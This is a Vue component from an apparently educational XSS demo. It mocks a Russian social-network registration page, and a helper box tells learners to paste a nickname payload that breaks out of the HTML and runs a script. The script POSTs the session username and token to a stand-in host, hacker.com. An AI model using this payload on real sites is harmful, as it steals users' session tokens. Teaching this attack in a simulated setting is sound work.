<template>
  <div class="vk__container">
    <div class="vk__header">
      <div class="vk__logo" @click="$router.push(`/xss`)">
        <img
            src="/assets/img/VK.svg"
            alt="VS"
        />
        <p style="font-size: 2vw; margin-left: 0.7vw">ВСети</p>
      </div>
    </div>

    <div class="vk__registration__form">
      <p style="font-size: 1.5vw; font-weight: 500">РЕГИСТРАЦИЯ</p>
      <input
          class="vk__registration__input"
          placeholder="Никнейм"
          type="text"
          v-model="username"
      />
      <input
          class="vk__registration__input"
          placeholder="Пароль"
          type="password"
      />
      <button
          class="vk__registration__btn"
          @click="isRegister"
      >
        ЗАРЕГИСТРИРОВАТЬСЯ
      </button>
    </div>
    <anonymous-modal text-message="Тут мы введём никнейм (имя) пользователя c  закрывающим
                                  <br />HTML-тегом и скриптом, в котором будет код, отправляющий данные пользователя на адрес хакера.
                                  <br /><br />Рассмотрите и скопируйте код из чёрного окна, вставьте в поле “Никнейм”."></anonymous-modal>
      <div class="vk__helper__message">
        <span>NoName&lt;/p&gt;&lt;script&gt;<br/>
          (async () => {<br/>
          const data = {<br/>
          &nbsp;&nbsp;&nbsp;&nbsp;username: sessionStorage.getItem('username'),<br/>
          &nbsp;&nbsp;&nbsp;&nbsp;token: sessionStorage.getItem('token')<br/>
          };<br/>
          console.log('Ник: ', data.username, '\n\nТокен: ', data.token);<br/>
          const response = await fetch('http://hacker.com/send', {<br/>
          &nbsp;&nbsp;&nbsp;&nbsp;method: 'POST',<br/>
          &nbsp;&nbsp;&nbsp;&nbsp;headers: {
          &nbsp;&nbsp;&nbsp;&nbsp;'Content-Type': 'application/json'
          &nbsp;&nbsp;&nbsp;&nbsp;},<br/>
          &nbsp;&nbsp;&nbsp;&nbsp;body: JSON.stringify(data)<br/>
          });<br/>
          const result = await response.json();
      console.log('Отправлено на сервер hacker.com:', result);})()<br/>
          &lt;/script&gt;&lt;p&gt;</span>
        <button @click="copyToClipboard">Скопировать</button>
      </div>
  </div>
</template>

<script>
import AnonymousModal from "@/components/UI/AnonymousModal.vue";

export default {
  components: {AnonymousModal},
  data() {
    return {
      username: '',
      password: '',
    };
  },
  methods: {
    isRegister() {
      const token = Math.random().toString(36);
      sessionStorage.setItem('username', this.username);
      sessionStorage.setItem('token', token);
      this.$router.push(`/startXSS`);
    },
    copyToClipboard() {
      const textToCopy = document.querySelector('.vk__helper__message span').textContent
      navigator.clipboard.writeText(textToCopy);
    }
  }
}
</script>

<style scoped>
.vk__container {
  z-index: 0;
  width: 100vw;
  height: 100vh;
  background-color: rgba(237, 237, 239, 1);
  display: flex;
  flex-direction: column;
}

.vk__header {
  width: 100vw;
  height: 10vh;
  background-color: #FFFFFF;
  box-shadow: 0 0.5vh 0.5vh 0 rgba(0, 0, 0, 0.25);
  display: flex;
  align-items: center;
  padding: 0 4vw 0 4vw;
}

.vk__logo {
  display: flex;
  align-items: center;
  cursor: pointer;
}

img {
  z-index: 150;
  height: 6vh;
}

.vk__registration__form {
  display: flex;
  flex-direction: column;
  justify-content: center;
  align-items: center;
  height: 70vh;
  width: 100vw;
}

.vk__registration__input {
  width: 30vw;
  height: 5vh;
  padding-left: 1vw;
  border: none;
  margin-top: 2vh;
  border-radius: 0.7vw;
}

.vk__registration__input:focus {
  outline: 0.1vw solid rgba(49, 54, 172, 1);
}

.vk__registration__btn {
  font-size: 1.2vw;
  font-weight: 500;
  margin-top: 2vh;
  border: none;
  background-color: rgba(49, 54, 172, 1);
  color: white;
  width: 30vw;
  height: 5vh;
  cursor: pointer;
  border-radius: 0.7vw;
}

.vk__helper__message {
  border-radius: 1vw;
  background: rgba(38, 50, 56, 0.93);
  width: 50vw;
  position: absolute;
  right: -3vw;
  z-index: 100;
  left: 5%;
  bottom: 5%;
  padding: 1.5vw 3vw 1.5vw 1.5vw;
  font-size: small;
}
.vk__helper__message span {
  color: rgba(53, 255, 49, 1);
}

.vk__helper__message button {
  background-color: rgba(0, 0, 0, 0);
  color: rgba(53, 255, 49, 1);
  border-radius: 1vh;
  border: 1px solid rgba(53, 255, 49, 1);
  padding: 0.5vw 1vw;
  font-size: small;
  cursor: pointer;
  position: absolute;
  right: 1vw;
  top: 2vh;
}

.vk__helper__message button:hover {
  background-color: rgba(53, 255, 49, 1);
  color: #212121;
}
</style>
